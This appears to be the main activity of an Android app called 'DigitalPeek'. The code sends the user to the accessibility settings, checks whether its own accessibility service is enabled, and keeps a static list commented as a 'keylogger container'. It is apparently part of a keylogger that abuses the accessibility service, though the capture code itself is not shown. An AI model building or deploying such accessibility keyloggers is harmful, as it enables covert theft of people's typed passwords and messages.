package com.example.digitalpeek;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.view.accessibility.AccessibilityManager;
import android.widget.TextView;

import java.util.ArrayList;
import java.util.List;



public class MainActivity extends AppCompatActivity {

    static List<String> container=new ArrayList<>();        //keylogger container

    //state
   boolean emptyContainer;
   public static boolean notificationIssued=false;

    //UI
    TextView state;

    //receiver
    public static String CHANNEL_ID="DigitalPeek";
    BroadcastReceiver mReceiver;
    @Override

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        createNotificationChannel();

        //setup
      emptyContainer=true;
      notificationIssued=false;
      state=(TextView)findViewById(R.id.state_text);


        //setting notification
        IntentFilter filter = new IntentFilter(Intent.ACTION_SCREEN_ON);
        filter.addAction(Intent.ACTION_SCREEN_OFF);
         mReceiver = new lockScreenReceiver();
        registerReceiver(mReceiver, filter);
    }





    @Override
    protected void onDestroy() {
        super.onDestroy();
        unregisterReceiver(mReceiver);
    }

    public void startAndFinish(View view)
    {
        container.clear();
        Intent intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
        startActivity(intent);

    }



    private void createNotificationChannel() {

            String description="Peek";

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            int importance = NotificationManager.IMPORTANCE_LOW;
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "peek", importance);
            channel.setDescription(description);
            // Register the channel with the system; you can't change the importance
            // or other notification behaviors after this
            NotificationManager notificationManager = getSystemService(NotificationManager.class);
            notificationManager.createNotificationChannel(channel);
        }
    }


    public static boolean isAccessibilityServiceEnabled(Context context, Class<? extends AccessibilityService> service) {
        AccessibilityManager am = (AccessibilityManager) context.getSystemService(Context.ACCESSIBILITY_SERVICE);
        List<AccessibilityServiceInfo> enabledServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK);

        for (AccessibilityServiceInfo enabledService : enabledServices) {
            ServiceInfo enabledServiceInfo = enabledService.getResolveInfo().serviceInfo;
            if (enabledServiceInfo.packageName.equals(context.getPackageName()) && enabledServiceInfo.name.equals(service.getName()))
                return true;

        }

        return false;
    }



    public void check(View view)
    {
        boolean enabled = isAccessibilityServiceEnabled(this, MyAccessibilityService.class);
        String display;
        int color;
        if(enabled)
        {
            display="State: Accessibility Enabled";
            color=ContextCompat.getColor(this, R.color.greenState);
        }

        else
        {
            display="State: Accessibility Disabled";
            color= ContextCompat.getColor(this, R.color.redState);
        }


        state.setText(display);
        state.setTextColor(color);
        state.setVisibility(View.VISIBLE);

    }

    public void disappear(View view)
    {
        state.setVisibility(View.GONE);

    }

    public static void restart()
    {
        container.clear();
        notificationIssued=false;

    }



}